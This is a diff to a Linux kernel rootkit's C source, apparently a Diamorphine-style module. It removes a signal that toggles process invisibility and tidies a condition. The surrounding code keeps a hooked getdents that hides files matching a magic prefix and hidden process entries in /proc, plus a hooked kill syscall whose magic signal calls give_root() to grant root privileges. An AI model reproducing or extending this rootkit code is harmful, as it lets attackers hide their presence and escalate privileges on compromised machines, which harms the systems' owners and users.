@@ -23,7 +23,6 @@ struct linux_dirent {
 };
 
 enum {
-	SIGINVIS = 31,
 	SIGSUPER = 64,
 	SIGMODINVIS = 63,
 };
@@ -96,16 +95,14 @@ unsigned int count){
 
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
 		proc = 1;
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
 		if ((!proc && 
 		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-		|| (proc &&
-		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+		|| (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
@@ -161,11 +158,6 @@ asmlinkage int hacked_kill(pid_t pid, int sig){
 	struct task_struct *task;
 
 	switch (sig) {
-		case SIGINVIS:
-			if ((task = find_task(pid)) == NULL)
-				return -ESRCH;
-			task->flags ^= PF_INVISIBLE;
-			break;
 		case SIGSUPER:
 			give_root();
 			break;
